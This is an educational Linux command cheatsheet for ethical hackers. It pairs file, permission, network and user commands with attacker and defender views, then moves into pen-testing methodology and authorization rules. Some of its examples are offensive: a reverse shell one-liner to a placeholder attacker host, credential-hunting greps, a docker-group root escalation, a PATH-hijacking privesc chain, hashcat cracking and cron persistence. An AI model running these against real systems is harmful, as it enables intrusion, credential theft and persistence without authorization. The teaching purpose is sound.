# 🐧 Linux Command Line Cheatsheet for Ethical Hackers

> *A cheatsheet is a map. This one shows you the terrain, and where the trapdoors are buried.*

A reference for Linux fundamentals with each concept paired to the offensive and defensive security perspective. Know the system, know the holes.

**Mental model:** Linux is a high-rise apartment building. The kernel is the foundation. The filesystem is the floor plan. Users are tenants. Permissions are key cards. Root is the building superintendent, and ethical hackers are the security consultants the owner pays to find every unlocked door before someone else does.

---

## 📑 Table of Contents

1. [Reading Files & Understanding Permissions](#1-reading-files--understanding-permissions)
2. [sudo vs su: Privilege Escalation 101](#2-sudo-vs-su-privilege-escalation-101)
3. [Creating, Moving, and Deleting Files](#3-creating-moving-and-deleting-files)
4. [Searching & Extracting Data from Files](#4-searching--extracting-data-from-files)
5. [Turning Commands into Scripts](#5-turning-commands-into-scripts)
6. [Where Data Lives: The Filesystem Map](#6-where-data-lives-the-filesystem-map)
7. [Your Computer on the Network](#7-your-computer-on-the-network)
8. [Basic Security & Identifying User Types](#8-basic-security--identifying-user-types)
9. [Managing File Permissions & Ownership](#9-managing-file-permissions--ownership)
10. [Pen Testing Fundamentals: What Every Ethical Hacker Should Know](#10-pen-testing-fundamentals-what-every-ethical-hacker-should-know)
11. [Quick Reference Tables](#11-quick-reference-tables)

---

## 1. Reading Files & Understanding Permissions

> *Reading a file is opening someone's diary. Permissions are the lock on it. The first thing a pentester does on a new box is figure out which diaries were left unlocked.*

### Reading file contents

| Command | What it does | Analogy |
|---|---|---|
| `cat file.txt` | Dumps the whole file to stdout | Pouring the whole jug out at once |
| `less file.txt` | Paginated, searchable view (`/term`, `q` to quit) | Reading a book one page at a time |
| `more file.txt` | Older, simpler pager | The DVD version of `less` |
| `head -n 20 file` | First 20 lines | Reading the prologue |
| `tail -n 20 file` | Last 20 lines | Reading the epilogue |
| `tail -f /var/log/syslog` | Follow live updates | Listening to a live broadcast |
| `wc -l file` | Line, word, byte count | Counting pages without reading |
| `file mystery.bin` | Identifies file type by magic bytes | Sniffing what's in the package |
| `strings binary` | Pulls printable text from binaries | Squeezing words out of a stone |
| `xxd file` / `hexdump -C file` | Hex view | X-ray vision for files |

### Permission anatomy

Run `ls -l` and you get something like:

```
-rwxr-xr--  1 alice  devs  4096 Oct 12 10:23 secret.sh
│└┬┘└┬┘└┬┘  │ └─┬─┘ └─┬─┘ └─┬┘  └────┬────┘ └──┬──┘
│ │  │  │   │   │     │    │        │         │
│ │  │  │   │   │     │    │        │         └── filename
│ │  │  │   │   │     │    │        └── modification time
│ │  │  │   │   │     │    └── size in bytes
│ │  │  │   │   │     └── group owner
│ │  │  │   │   └── user owner
│ │  │  │   └── hard link count
│ │  │  └── "others" perms (everyone else)
│ │  └── group perms
│ └── user (owner) perms
└── file type: `-` file, `d` directory, `l` symlink, `s` socket, `c` char device, `b` block device
```

Each `rwx` block: **r**ead (4), **w**rite (2), e**x**ecute (1). Add them up to get octal mode.

- `rwxr-xr--` = `754`
- `rw-r--r--` = `644` (typical file)
- `rwxr-xr-x` = `755` (typical script or binary)

### 🎯 Hacker's-eye view

When an attacker lands on a box, **reading is reconnaissance**. They are looking for:

- **World-readable secrets**: `cat /etc/passwd` (always readable, lists users), backup files (`*.bak`, `*~`), config files in `/opt`, `/var/www`, home dirs that leak DB credentials, API keys, or SSH keys.
- **Log files for context**: `/var/log/auth.log`, `/var/log/apache2/access.log` reveal user behavior, IP addresses, and sometimes credentials accidentally typed into the username field.
- **History files**: `~/.bash_history`, `~/.mysql_history`, `~/.python_history`. Devs frequently paste passwords inline.
- **Hidden files**: `ls -la` reveals dotfiles. Things like `.env`, `.ssh/id_rsa`, `.git/config`.

**Defender takeaway:** `chmod 600 ~/.ssh/id_rsa` is not optional. Audit world-readable files in sensitive paths with `find / -type f -perm -o=r 2>/dev/null`. Don't commit `.env` to git.

---

## 2. sudo vs su: Privilege Escalation 101

> *`su` is borrowing someone's whole identity for the night. `sudo` is borrowing their car for one specific errand, with a logged trip report.*

### The difference

| | `su` | `sudo` |
|---|---|---|
| What it does | Switches to another user shell entirely | Runs a single command as another user |
| Default target | `root` | `root` (configurable per-command) |
| Password required | The **target** user's password | **Your own** password |
| Granular control | None, all-or-nothing | Per-command via `/etc/sudoers` |
| Auditability | Weak | Strong (logged to `/var/log/auth.log`) |

```bash
su -                    # full login shell as root (need root's password)
su - alice              # become alice
sudo command            # run command as root
sudo -u bob command     # run command as bob
sudo -i                 # interactive root shell
sudo -l                 # list what YOU are allowed to sudo
```

The `sudoers` file (`/etc/sudoers`, edited with `visudo`) defines who can run what:

```
# user host=(runas) commands
alice ALL=(ALL:ALL) ALL                    # alice is basically root
bob   ALL=(root) NOPASSWD: /usr/bin/apt    # bob can apt without a password (danger)
%devs ALL=(ALL) /usr/bin/systemctl restart nginx   # group rule
```

### 🎯 Hacker's-eye view

`sudo -l` is **the first command** an attacker runs after getting a shell. It tells them their privilege escalation path on a silver platter.

**Classic vulnerability patterns:**

- **`NOPASSWD` on a binary that can shell out.** Many "innocent" tools (`vim`, `less`, `find`, `awk`, `python`, `tar`, `zip`) have escape hatches. If you can run `sudo vim` you can do `:!bash` and you're root. The reference is [GTFOBins](https://gtfobins.github.io), a full catalog of how everyday utilities become privesc tools when sudo'd.
- **`ALL=(ALL) ALL` over-permission.** Giving full sudo to a low-trust user defeats the point.
- **Wildcards in sudoers paths.** `sudo /usr/bin/cat /var/log/*` looks safe, until the attacker creates `/var/log/../etc/shadow` and reads it.
- **`su` to a service account.** If `apache` or `mysql` has a shell and a weak or known password, attackers pivot laterally.

**Why this matters defensively:** every `sudo` rule is a tiny attack surface. The principle of least privilege isn't bureaucratic. It's the difference between a contained breach and a domain takeover. Audit with `sudo -l -U username` for any user.

---

## 3. Creating, Moving, and Deleting Files

> *Filesystem operations are the carpentry of Linux. Hackers are the burglars who learn carpentry to figure out where to install hidden compartments.*

### Core commands

```bash
# Create
touch file.txt                  # empty file (or update timestamp)
mkdir newdir                    # one directory
mkdir -p path/to/nested/dir     # create whole tree
echo "hi" > file.txt            # write (overwrite)
echo "hi" >> file.txt           # append

# Copy
cp src.txt dst.txt              # single file
cp -r srcdir/ dstdir/           # recursive (directories)
cp -p file backup               # preserve perms/timestamps
cp -a srcdir/ dstdir/           # archive mode (perms, links, times)

# Move / rename (same command, Linux doesn't distinguish)
mv old.txt new.txt
mv file.txt /tmp/

# Delete
rm file.txt                     # delete file
rm -i file.txt                  # interactive (asks)
rm -r dir/                      # recursive
rm -rf dir/                     # recursive + force (DANGEROUS, no undo, no recycle bin)
rmdir emptydir/                 # only works if empty

# Links
ln target hardlink              # hard link (same inode)
ln -s target symlink            # symbolic link (a pointer/shortcut)
```

⚠️ **There is no Recycle Bin in the terminal.** `rm -rf /` will start eating your filesystem. Modern `rm` blocks `/` itself with `--no-preserve-root` required, but `rm -rf $UNSET_VAR/*` becomes `rm -rf /*` and that has destroyed many production servers.

### 🎯 Hacker's-eye view

**Where attackers like to write:**

- **`/tmp` and `/var/tmp`** are world-writable by default. The classic dropzone for staging exploits, payloads, downloaded binaries. Defenders should mount `/tmp` with `noexec` to break this pattern (though it's bypassable).
- **`/dev/shm`** is RAM-backed tmpfs, also world-writable, leaves no disk forensic trace after reboot.
- **Writable cron paths.** If `/etc/cron.d/` or any cron script is world-writable, dropping a malicious file equals scheduled root execution.
- **PATH-injectable directories.** If a writable directory appears in `$PATH` *before* `/usr/bin`, an attacker can shadow `ls` or `sudo` with a trojan.

**Hiding files (the dot trick):** Filenames starting with `.` are hidden from default `ls`. Attackers love `...` (three dots), `..  ` (dot-dot-space), or names mimicking system files. `ls -la` and `find / -name "..*"` flush them out.

**Anti-forensics:**

```bash
shred -uvz file.txt    # overwrite with random data, then zeros, then unlink
```

Real defenders should know that `rm` does NOT erase data. It unlinks the inode. The blocks remain on disk until overwritten. Forensics tools (`extundelete`, `photorec`) recover "deleted" files. That's why `shred`, full-disk encryption (LUKS), and SSD TRIM matter.

**Symlink attacks:** if a privileged process writes to `/tmp/output.log` without checking, an attacker can symlink `/tmp/output.log -> /etc/passwd` and trick the process into clobbering the password file. Mitigated by `O_NOFOLLOW` flags in code and `/tmp` symlink protection (`fs.protected_symlinks=1` sysctl).

---

## 4. Searching & Extracting Data from Files

> *`grep`, `find`, `awk`, `sed` are the four horsemen of text manipulation. Together they're how you turn a forest of files into the one fact you need. Pentesters live in these.*

### `find`: locate files by attributes

```bash
find / -name "config.php" 2>/dev/null
find /home -type f -name "*.key"
find / -type f -size +100M               # files bigger than 100MB
find / -mtime -1                         # modified in last 24h
find . -name "*.log" -exec rm {} \;      # find + execute
find / -user alice                       # files owned by alice
find / -perm -4000 2>/dev/null           # SUID binaries 🚨
find / -perm -2000 2>/dev/null           # SGID binaries
find / -writable -type d 2>/dev/null     # writable dirs
```

### `grep`: pattern search inside files

```bash
grep "password" config.php
grep -i "pass" file.txt                  # case-insensitive
grep -r "TODO" src/                      # recursive
grep -n "error" log.txt                  # show line numbers
grep -v "INFO" log.txt                   # invert (everything except)
grep -E "user[0-9]+" file                # extended regex
grep -A 3 -B 2 "ERROR" log.txt           # 3 after, 2 before context
```

### `awk`: column processor and mini-language

```bash
awk '{print $1}' access.log              # first whitespace column
awk -F: '{print $1}' /etc/passwd         # split by colon, get usernames
awk '$3 > 1000 {print $1}' /etc/passwd | awk -F: '{print}'  # uid>1000 users
awk '/ERROR/ {count++} END {print count}' log.txt
```

### `sed`: stream editor

```bash
sed 's/old/new/g' file.txt               # global replace
sed -i 's/old/new/g' file.txt            # in-place edit
sed -n '10,20p' file.txt                 # print lines 10-20
sed '/^#/d' config.conf                  # delete comment lines
```

### Pipeline glue

```bash
cut -d: -f1 /etc/passwd                  # first colon-delimited field
sort | uniq -c | sort -rn                # frequency count
tr 'a-z' 'A-Z'                           # translate chars
xargs                                    # turn stdin into args
tee file                                 # split output to file AND stdout
```

### 🎯 Hacker's-eye view

This section is **the entire enumeration phase** of a pentest in a nutshell.

**The privesc one-liner everyone learns:**

```bash
find / -perm -4000 -type f 2>/dev/null
```

This finds all SUID binaries, files that run with the **owner's** privileges regardless of who executes them. If `/usr/bin/passwd` is SUID root, that's expected (it has to write to `/etc/shadow`). If `/home/alice/notes` is SUID root, someone messed up, and an attacker just got root.

**Credential hunting greps:**

```bash
grep -r -iE "password|passwd|api[_-]?key|secret|token" /var/www/ 2>/dev/null
grep -r "BEGIN RSA PRIVATE KEY" / 2>/dev/null
find / -name "*.bak" -o -name "*~" -o -name "*.old" 2>/dev/null
```

**Log analysis (defender side):**

```bash
# Top 10 IPs hitting your web server
awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -rn | head

# Failed SSH login attempts
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn
```

The same tools that find vulnerabilities also detect intrusions. The asymmetry: defenders need to find every anomaly, attackers only need one hit.

---

## 5. Turning Commands into Scripts

> *A script is just a recipe card. The shebang is the title that tells the kitchen which chef should cook it.*

### The minimum viable script

```bash
#!/bin/bash
# myscript.sh - example

set -euo pipefail   # fail fast: error, unset vars, pipe failures

NAME="${1:-world}"
echo "Hello, $NAME!"
```

```bash
chmod +x myscript.sh   # make executable
./myscript.sh Brittney # run
```

The `#!/bin/bash` is the **shebang**. It tells the kernel "use this interpreter." `#!/usr/bin/env python3` for Python, `#!/usr/bin/env node` for Node, etc. The `env` form is more portable.

### Variables, conditionals, loops

```bash
# Variables (no spaces around =)
greeting="hello"
echo "$greeting world"          # double quotes interpolate
echo '$greeting world'          # single quotes literal

# Command substitution
files=$(ls /tmp)
today=$(date +%F)

# Arithmetic
count=$((1 + 2))

# Conditionals
if [[ -f "/etc/passwd" ]]; then
  echo "exists"
elif [[ -d "/tmp" ]]; then
  echo "dir"
else
  echo "neither"
fi

# Useful test operators
# -f file exists, -d dir exists, -r readable, -w writable, -x executable
# -z empty string, -n nonempty, ==, !=, =~ (regex)
# numeric: -eq, -ne, -lt, -le, -gt, -ge

# Loops
for f in *.log; do
  echo "Processing $f"
done

while read -r line; do
  echo "Got: $line"
done < input.txt

# Functions
greet() {
  local name="$1"
  echo "Hi, $name"
}
greet "Brittney"
```

### Cron: scheduled scripts

```bash
crontab -e          # edit your crontab
crontab -l          # list

# Format: minute hour day month weekday command
# Run every day at 3am:
0 3 * * * /home/alice/backup.sh
```

System-wide jobs live in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/crontab`.

### 🎯 Hacker's-eye view

**Cron is a top persistence mechanism.** When attackers gain a foothold, they need to survive reboot. Common moves:

- Drop a script in `/etc/cron.daily/` that re-establishes a reverse shell
- Modify the user's crontab if they have one
- Hide in `/etc/cron.d/` with an innocuous filename like `0logrotate-helper`

**Reverse shell scripting**, the canonical "got remote code execution, now what" snippet:

```bash
bash -i >& /dev/tcp/attacker.ip/4444 0>&1
```

This is *the* test pattern in CTFs and pentests. As a defender: outbound firewall rules, plus EDR catching `bash -i` patterns, plus monitoring `/dev/tcp` use.

**Shell injection vulnerabilities** in scripts: when a script does `eval "$user_input"` or `bash -c "$untrusted"`, you've handed over the keys. The defense pattern is `set -u` (fail on undefined vars), proper quoting (`"$var"` not `$var`), and `--` to terminate option parsing.

**Why `set -euo pipefail` matters:** without it, scripts march on after errors. A backup script that silently fails to back up but keeps running rotation logic equals data loss. For security scripts, partial execution can leave systems in an exploitable half-configured state.

---

## 6. Where Data Lives: The Filesystem Map

> *The Filesystem Hierarchy Standard (FHS) is the city's zoning code. Once you know it, every Linux box looks like the same neighborhood with different paint.*

### The treasure map

```
/                  ← root of everything (not the user "root")
├── bin/           Essential user binaries (ls, cat, cp), often → /usr/bin
├── boot/          Kernel, initramfs, bootloader configs
├── dev/           Device files (everything-is-a-file: /dev/sda, /dev/null, /dev/random)
├── etc/           System-wide configuration. The "settings menu" of the OS.
│   ├── passwd     User accounts (world-readable)
│   ├── shadow     Hashed passwords (root-only, mode 000 or 600)
│   ├── group      Group definitions
│   ├── sudoers    Who can sudo what
│   ├── ssh/       SSH server configs and host keys
│   └── cron.d/    Scheduled jobs
├── home/          Per-user homes (~)
│   └── alice/
│       ├── .ssh/         SSH keys (id_rsa, authorized_keys)
│       ├── .bash_history Shell history
│       └── .config/      Per-user app config
├── lib/, lib64/   Shared libraries (.so files)
├── media/, mnt/   Mount points for removable/temporary devices
├── opt/           Optional/third-party software ("opting in" extras)
├── proc/          Virtual FS, live kernel/process info, not real files
│   ├── cpuinfo    CPU details
│   ├── [pid]/     Per-process info: cmdline, environ, fd/, maps
│   └── version    Kernel version
├── root/          The root user's home (NOT the / filesystem root)
├── run/           Runtime data (PIDs, sockets), tmpfs since boot
├── sbin/          System binaries (admin tools)
├── srv/           Data served by the system (web, ftp roots, by convention)
├── sys/           Virtual FS for kernel/device interaction (sysfs)
├── tmp/           Temporary, world-writable, sometimes wiped at boot
├── usr/           "User" hierarchy, most installed software
│   ├── bin/       Most binaries actually live here
│   ├── lib/       Libraries
│   ├── local/     Stuff installed by sysadmin (not the package manager)
│   └── share/     Architecture-independent data, docs, man pages
└── var/           Variable data (logs, mail, spool, caches)
    ├── log/       /var/log/auth.log, syslog, apache, etc.
    ├── www/       Common web root
    └── lib/       App state (databases, etc.)
```

### Inspection commands

```bash
df -h               # disk usage by mount point
du -sh /var/log/*   # size per item
mount               # what's mounted where
lsblk               # block device tree
stat file.txt       # detailed metadata (atime, mtime, ctime, inode)
```

### 🎯 Hacker's-eye view

This map is **the loot list**. After landing on a box, attackers run a mental checklist:

| Path | Why it matters |
|---|---|
| `/etc/passwd` | User enumeration, always readable |
| `/etc/shadow` | Password hashes, needs root, but if you can read it, hashcat awaits |
| `/etc/sudoers`, `/etc/sudoers.d/` | Privesc paths |
| `/etc/ssh/sshd_config` | Is root login allowed? Are passwords enabled? |
| `/etc/crontab`, `/etc/cron.d/` | Privileged scheduled jobs to hijack |
| `~/.ssh/id_rsa` | Private SSH keys, lateral movement to other servers |
| `~/.ssh/authorized_keys` | Backdoor: append your key, you have permanent access |
| `~/.bash_history` | Commands users typed, including pasted passwords |
| `/var/log/*` | Forensic gold (defenders), evidence to wipe (attackers) |
| `/var/www/` | Web app source. Find DB creds in `wp-config.php`, `.env` |
| `/proc/[pid]/environ` | Environment variables of running processes, sometimes hold secrets |
| `/proc/[pid]/cmdline` | Full command line, passwords passed as args leak here |
| `/dev/shm/` | Stealthy in-memory dropzone |
| `/tmp/` | Same, but disk-backed |
| `/opt/` | Custom enterprise apps, often poorly hardened |

**Why `/proc` is wild:** it's a window into the running kernel. Every process gets a directory. `cat /proc/$$/environ` shows your shell's environment. Attackers love this for snooping on other users' processes (mitigated by `hidepid=2` mount option).

**Defender rule of thumb:** if it's in `/etc` and contains secrets, it should be `chmod 600` and owned by `root`. If it's in `/var/log`, it should be append-only where possible, and shipped off-host (because attackers will edit logs).

---

## 7. Your Computer on the Network

> *A networked computer is an apartment with windows. Every open port is a window. Every running service is a person waving from inside one.*

### Inspection commands

```bash
# IP addresses & interfaces
ip a                        # modern (replaces ifconfig)
ip route                    # routing table (replaces `route`)
ifconfig                    # legacy but still common

# Open connections / listening ports
ss -tulnp                   # modern: TCP, UDP, listening, numeric, processes
netstat -tulnp              # legacy equivalent
lsof -i :80                 # who has port 80 open

# DNS
dig example.com             # DNS query
dig example.com MX
nslookup example.com        # simpler DNS
host example.com

# Reachability
ping 8.8.8.8                # ICMP echo
ping -c 4 host              # bounded
traceroute host             # path to host
mtr host                    # ping + traceroute combined

# Fetching
curl https://example.com                       # HTTP request, output to stdout
curl -I https://example.com                    # headers only
curl -sL example.com -o page.html              # silent, follow redirects
curl -X POST -d "k=v" example.com/api          # POST
wget https://example.com/file.tar.gz           # download

# ARP & low-level
ip neigh                    # ARP cache
arp -a                      # legacy

# Firewall
sudo iptables -L -n -v      # legacy firewall rules
sudo nft list ruleset       # modern nftables
sudo ufw status             # Ubuntu's friendly wrapper

# Remote shell
ssh user@host
ssh -i key.pem user@host
ssh -L 8080:localhost:80 user@host    # local port forward (tunnel)
ssh -D 1080 user@host                 # SOCKS proxy through host
scp file user@host:/path              # secure copy
```

### Reading `ss -tulnp` output

```
Netid State   Local Address:Port    Peer Address:Port  Process
tcp   LISTEN  0.0.0.0:22            0.0.0.0:*         sshd
tcp   LISTEN  127.0.0.1:5432        0.0.0.0:*         postgres
tcp   LISTEN  :::80                 :::*               nginx
```

`0.0.0.0` means listening on all interfaces (exposed). `127.0.0.1` means loopback only (local). `::` means IPv6 all interfaces. **The first line is much scarier than the second** if SSH is exposed to the internet with weak auth.

### 🎯 Hacker's-eye view

The network is the **attack surface**. Every offensive engagement starts here.

**External recon (before getting in):**
- `nmap -sV target` for port scan plus service version detection
- `nmap -sC -sV -p- target` for default scripts plus all ports
- `dig target ANY`, `dig axfr` (zone transfer attempts)
- Subdomain enumeration: `dig`, `amass`, `subfinder`

**Internal recon (after foothold):**
- `ss -tulnp` to find services bound only to localhost. Those are *only* reachable from the inside, often less hardened, prime pivot targets.
- `ip route` and `arp -a` to map the internal network.
- Pivoting via SSH tunnels: `ssh -D 1080` turns a compromised host into a SOCKS proxy so the attacker's tools can reach internal resources.

**Common vulnerabilities by category:**

| Service exposed | Risk |
|---|---|
| SSH on `0.0.0.0` with password auth | Brute force / credential stuffing. Disable passwords, use keys |
| Database (3306, 5432, 27017) on public IP | Unauthenticated or default-cred access. **Should never be internet-facing.** |
| Redis on `0.0.0.0` with no auth | Trivial RCE via `CONFIG SET dir` plus key-as-cron-file trick |
| SMB/445 exposed | EternalBlue and friends |
| Outbound DNS allowed but nothing else | DNS tunneling for C2 (covert channel) |

**Network-level deception:**
- `curl --resolve` and `/etc/hosts` manipulation can spoof targets.
- ARP spoofing (`arpspoof`, `ettercap`) on a LAN puts you in the middle of someone's traffic.
- SSL stripping is dead in the era of HSTS, but `mitmproxy` is still a daily driver for testing.

**Defensive baseline:** firewall default-deny inbound, default-deny outbound where feasible (containment for compromised hosts is the modern frontier), bind services to `127.0.0.1` unless they need external access, fail2ban for SSH, mTLS for service-to-service.

---

## 8. Basic Security & Identifying User Types

> *In Linux, identity is a number. The number is your UID. UID 0 is god. Everyone else is bargaining.*

### Who am I, who is anyone

```bash
whoami                  # your username
id                      # uid, gid, groups
id alice                # someone else's
groups                  # your groups
who                     # who's currently logged in (login records)
w                       # who plus what they're running
last                    # historical logins (from /var/log/wtmp)
lastlog                 # last login per user
```

### The user/group trinity

| File | Purpose | Permissions |
|---|---|---|
| `/etc/passwd` | One line per user: name, uid, gid, gecos, home, shell | `644` (world-readable) |
| `/etc/shadow` | Password hashes plus aging info | `000` or `640` (root-only) |
| `/etc/group` | Group name to gid to member list | `644` |
| `/etc/gshadow` | Group passwords (rare) | root-only |

A `passwd` line:

```
alice:x:1001:1001:Alice Example,,,:/home/alice:/bin/bash
└─┬─┘ │ └┬─┘ └┬─┘ └────┬─────────┘ └────┬────┘ └───┬───┘
  │   │  │    │        │                 │          └── login shell
  │   │  │    │        │                 └── home directory
  │   │  │    │        └── GECOS (full name plus comments)
  │   │  │    └── primary GID
  │   │  └── UID  (0=root, 1-999=system, 1000+=human users typically)
  │   └── password placeholder ('x' means see /etc/shadow)
  └── username
```

### User types

| UID range | Who | Examples |
|---|---|---|
| `0` | root, total power | `root` |
| `1`–`999` | system / service accounts | `daemon`, `bin`, `www-data`, `mysql`, `nobody` |
| `1000`+ | regular human users | `alice`, `brittney` |
| `65534` | nobody | the "least trusted" account |

Service accounts often have `/usr/sbin/nologin` or `/bin/false` as their shell. They exist to own files, not to log in.

### User management

```bash
sudo useradd -m -s /bin/bash bob       # add bob with home dir
sudo passwd bob                         # set bob's password
sudo usermod -aG sudo bob              # add bob to sudo group
sudo userdel -r bob                    # delete bob and home
sudo groupadd devs                     # new group
sudo gpasswd -a alice devs             # add alice to devs
```

### 🎯 Hacker's-eye view

After landing, the attacker maps the **identity graph**:

```bash
cat /etc/passwd            # who exists?
cat /etc/group             # who's in privileged groups?
getent passwd              # same, but includes LDAP/network sources
who; w; last -20           # who's around right now? recent activity?
```

**What they're looking for:**

- Users in `sudo`, `wheel`, `admin`, `docker`, `lxd`, `disk` groups. Those groups are functionally root.
  - `docker` group? `docker run -v /:/host -it ubuntu chroot /host` equals root. The Docker socket is a privesc primitive.
  - `disk` group? Direct read/write to block devices equals reading `/etc/shadow` raw.
  - `lxd`? Same story, container escape to root.
- Service accounts with shells (often misconfigured).
- Users with `UID=0` other than `root`. A classic backdoor: any UID-0 user IS root.

**Password hash crackability:** if an attacker exfiltrates `/etc/shadow`, the format is `$id$salt$hash`:

- `$1$` is MD5 (broken, fast to crack)
- `$5$` is SHA-256
- `$6$` is SHA-512 (default on most distros)
- `$y$` or `$argon2id$` is yescrypt or argon2 (modern, slow, good)

`hashcat -m 1800 hashes.txt rockyou.txt` is the standard offline attack. Defense: long passwords (length over complexity), MFA, hash algorithm choice doesn't save you if the password is `Summer2024!`.

**Account hygiene defender checklist:**
- No password-auth SSH for any user (keys only).
- `useradd` defaults audited, no `/bin/bash` shell for service accounts.
- Group memberships reviewed quarterly (especially `sudo`, `docker`).
- `last`, `lastlog`, and `auth.log` shipped to a SIEM.
- Locked accounts: `passwd -l alice` (prefix `!` in shadow).

---

## 9. Managing File Permissions & Ownership

> *Ownership says who the file belongs to. Permissions say what the owner, and everyone else, can do with it. Together, they're the access control list of the entire OS.*

### `chmod`: change permissions

Two notations: **symbolic** and **octal**.

```bash
# Symbolic: u(ser) g(roup) o(ther) a(ll) +/-/= r/w/x
chmod u+x script.sh           # add execute for owner
chmod g-w file                # remove write from group
chmod o= file                 # set "other" to nothing
chmod a+r file                # everyone can read
chmod u=rwx,go=rx file        # explicit set

# Octal: each digit is a permission triplet
# r=4, w=2, x=1, sum per identity (owner, group, other)
chmod 755 script.sh           # rwxr-xr-x, typical executable
chmod 644 file.txt            # rw-r--r--, typical file
chmod 600 ~/.ssh/id_rsa       # rw-------, private keys (REQUIRED)
chmod 700 ~/.ssh              # rwx------, private dir
chmod 777 file                # rwxrwxrwx, almost always WRONG
chmod -R 755 dir/             # recursive
```

### `chown` and `chgrp`: change ownership

```bash
sudo chown alice file              # change owner
sudo chown alice:devs file         # owner AND group
sudo chgrp devs file               # group only
sudo chown -R alice:alice /home/alice
```

### Special bits: the wild cards

Beyond `rwx` there are three special bits, occupying a 4th octal digit:

| Bit | Octal | Symbol | On a file | On a directory |
|---|---|---|---|---|
| **SUID** | 4000 | `s` in user-x slot | Runs as the **file owner** | (no effect) |
| **SGID** | 2000 | `s` in group-x slot | Runs as the file's **group** | New files inherit the dir's group |
| **Sticky** | 1000 | `t` in other-x slot | (rarely used) | Only file owner can delete (used on `/tmp`) |

```bash
chmod u+s binary       # SUID
chmod g+s dir          # SGID
chmod +t /shared       # sticky bit
chmod 4755 prog        # SUID plus 755
ls -l /usr/bin/passwd  # → -rwsr-xr-x. The s shows SUID.
ls -ld /tmp            # → drwxrwxrwt. The t shows sticky.
```

### `umask`: default permissions for new files

```bash
umask                  # show current (e.g., 0022)
umask 077              # only owner gets perms on new files
```

`umask` is *subtracted* from the system default (777 for dirs, 666 for files). `umask 022` gives new files of 644 and dirs of 755.

### ACLs: when standard perms aren't enough

Standard perms only describe owner, group, and other. For "alice can write but bob can only read this one file," use POSIX ACLs:

```bash
setfacl -m u:bob:r-- file
getfacl file
```

### 🎯 Hacker's-eye view

This is **ground zero for privilege escalation.**

**SUID/SGID hunting** is the iconic privesc move:

```bash
find / -perm -4000 -type f 2>/dev/null    # all SUID
find / -perm -2000 -type f 2>/dev/null    # all SGID
```

A standard system has a known set of SUID binaries (`passwd`, `sudo`, `mount`, `su`, `ping` on older systems). **Anything else is suspicious.** And even for the standard ones, version vulnerabilities matter: a SUID-root `nmap` (older versions had `--interactive` shells) or `find` (`-exec /bin/sh \;`) is instant root. Again, [GTFOBins](https://gtfobins.github.io) catalogs these.

**Why SUID exists at all:** `passwd` needs to write to `/etc/shadow`, which only root can write to. SUID is the mechanism that lets a regular user invoke a program that *temporarily* runs as root, but only along the narrow path the program defines. When that path has a leak (command injection, path traversal, format string bug), the leak goes straight to root.

**World-writable files** (`-rw-rw-rw-`, `-rwxrwxrwx`) are the other classic find:

```bash
find / -perm -o=w -type f 2>/dev/null
find / -perm -o=w -type d 2>/dev/null
```

If `/etc/passwd` is world-writable (it shouldn't be, but you'd be surprised), any user can add a UID-0 account. If a script run by cron-as-root is world-writable, any user can edit it and own the box.

**Wrong ownership** is subtler:
- Web app files owned by `root` but the web server runs as `www-data` may break the app, OR if the app has an upload feature with bad perm-setting, lead to weird states.
- Files in `/home/alice` owned by `bob` are either misconfiguration or post-exploitation evidence.

**The classic privesc chain via permissions:**
1. `find / -perm -4000 -type f 2>/dev/null` reveals an unusual SUID binary like `/usr/local/bin/backup`.
2. `strings /usr/local/bin/backup` shows it calls `tar` without absolute path.
3. Attacker creates a malicious `tar` in a writable directory, prepends to `$PATH`.
4. Runs the SUID `backup`. The malicious `tar` runs as root.
5. Root shell.

This **"PATH hijacking on a SUID binary"** scenario is ancient and still appears in the wild, especially in custom enterprise tooling. The defense: SUID programs should set `PATH` explicitly, use absolute paths for everything, and drop privileges as soon as possible.

**Defender's permission audit:**

```bash
# Files writable by anyone, top suspects
find / -xdev -type f -perm -o+w ! -path "/proc/*" 2>/dev/null

# SUID/SGID files outside the expected list
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null

# Files with no owner (deleted users), possible attacker artifacts
find / -xdev \( -nouser -o -nogroup \) 2>/dev/null
```

---

## 10. Pen Testing Fundamentals: What Every Ethical Hacker Should Know

> *A pentest without authorization is a crime. A pentest without methodology is theater. A pentest without a report is a hobby. The job is all three at once.*

Linux fluency is the language. Pen testing is the actual job that uses it. Here is the structural knowledge to put the commands in context.

### 10.1 The Authorization Rule (Read This First)

**Nothing in this cheatsheet is legal to use against a system you don't own or have written permission to test.** The Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and similar laws worldwide do not care that you "didn't do any damage" or "were just curious." Unauthorized access is the crime. Intent is sentencing.

A legitimate engagement always has:

- **A signed Statement of Work (SOW)** describing the engagement type, deliverables, and timeline.
- **Rules of Engagement (RoE)** specifying scope (IP ranges, domains, applications), out-of-scope items, allowed techniques, time windows, and emergency contacts.
- **Authorization letter** signed by someone who actually has authority to authorize testing on those assets. (Not just "the dev manager said it was fine.")
- **Cloud provider notification** where required (AWS no longer requires it for most services, Azure and GCP have their own policies, always verify).
- **Data handling agreement.** What happens to credentials, PII, and screenshots you collect. Encrypted at rest, deleted on a schedule, never shared outside the agreed team.

If you don't have the paperwork, you don't have an engagement. You have a felony in progress.

### 10.2 Engagement Types (Know What You're Selling)

| Engagement | Scope | Mindset |
|---|---|---|
| **Vulnerability Assessment** | Find and rank vulnerabilities | Breadth, automated scans, low exploitation |
| **Penetration Test** | Find AND exploit a defined scope | Depth, manual validation, proof of impact |
| **Red Team** | Achieve specific objectives ("steal the crown jewels") against a defending blue team, often without their knowledge | Stealth, full kill chain, social engineering allowed |
| **Purple Team** | Red team plus blue team collaborating in real time | Detective control improvement |
| **Bug Bounty** | Open-scope public program with payout per finding | Volume, novelty, write-up quality |

Within penetration tests, the **box color** describes how much info you get up front:

- **Black box**: nothing. You know the target name and that's it.
- **Gray box**: limited info, sometimes a low-priv user account.
- **White box** (also "crystal box"): full access including source code, architecture diagrams, admin credentials.

White box is more thorough per dollar. Black box more closely simulates a real external attacker. Gray box is the pragmatic middle ground most firms ask for.

### 10.3 The Methodology (Phases of an Engagement)

The industry-standard reference is the **PTES** (Penetration Testing Execution Standard). It overlaps heavily with the **OSSTMM**, **NIST SP 800-115**, and the **MITRE ATT&CK** framework.

**Phase 1: Pre-engagement.** Scope, RoE, contracts, kickoff call. Discussed above.

